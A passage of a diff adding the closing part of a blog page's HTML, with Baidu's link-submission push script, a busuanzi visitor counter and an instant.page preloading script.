+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
